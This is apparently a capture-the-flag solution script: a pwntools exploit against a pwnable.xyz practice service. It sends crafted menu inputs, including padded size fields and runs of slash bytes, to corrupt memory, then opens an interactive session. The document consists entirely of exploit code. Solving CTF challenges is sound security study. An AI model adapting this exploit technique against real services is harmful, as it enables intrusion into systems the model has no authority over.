逻辑



```python
from pwn import *

context.terminal = ['tmux', 'splitw', '-h']


p = remote('svc.pwnable.xyz', 30021)
# p = process('./challenge')


for i in range(4):
    p.sendafter(b'> ', b'2')
    p.sendafter(b'Secure or insecure: ', b'http/////')
    bytes_n = 0x40
    p.sendafter(b'Size of url: ', str.encode(str(bytes_n)).ljust(0x20, p8(0)) + b'/' * bytes_n)


p.sendafter(b'> ', b'4')
# gdb.attach(p)


p.interactive()

```

